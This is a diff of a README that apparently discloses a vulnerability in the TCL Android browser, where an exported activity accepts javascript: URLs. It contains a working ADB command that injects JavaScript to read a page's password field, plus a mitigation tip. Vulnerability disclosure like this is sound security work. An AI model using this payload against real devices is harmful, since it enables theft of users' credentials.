@@ -1,5 +1,6 @@
 *** This vulnerability was intially disclosed to TCL on 9/2023 ***
 
+
 ![image](https://github.com/actuator/com.tcl.browser/assets/78701239/82062ff5-9806-499b-85ed-68cb3594e8ae)
 
 
@@ -35,11 +36,13 @@ This vulnerability is particularly concerning because:
 
 ![image](https://github.com/actuator/com.tcl.browser/blob/main/poc.gif)
 
-These ADB commands inject JavaScript to extract password data** & can be accomplished without ADB with no permissions.
+These ADB commands inject JavaScript to extract password data* & can be accomplished without ADB with no permissions.
+
 
 ```bash
 adb shell am start -a android.intent.action.VIEW -d 'javascript:(function()%7Bvar%20password%20%3D%20document.getElementById(%27pass%27).value%3Balert(%27Password%3A%20%27%20%2B%20password)%3B%7D)()' com.tcl.browser/com.tcl.browser.portal.browse.activity.BrowsePageActivity
 ```
+
 Facebook.com
 
 ![image](https://github.com/actuator/com.tcl.browser/blob/main/Facebook.gif)
@@ -55,6 +58,9 @@ Google.com
 
 ![image](https://github.com/actuator/com.tcl.browser/blob/main/Gmail.gif)
 
+
+
+---
 
 To demonstrate the vulnerability, one can create a simple Android app that invokes the exported `BrowsePageActivity` activity:
 
@@ -97,8 +103,4 @@ Assisting in malicious persistence.
 1. **Restrict Activity Export:** Do not export activities unless necessary.
 If required, implement proper authorization checks to ensure that only legitimate entities can invoke it.
 
-**These POC's were adapted from research by Asmit Nayak, Rishabh Khandelwal, Kassem Fawaz & the University of Wisconsin – Madison**
-```
- https://arxiv.org/pdf/2308.16321.pdf
-```
 
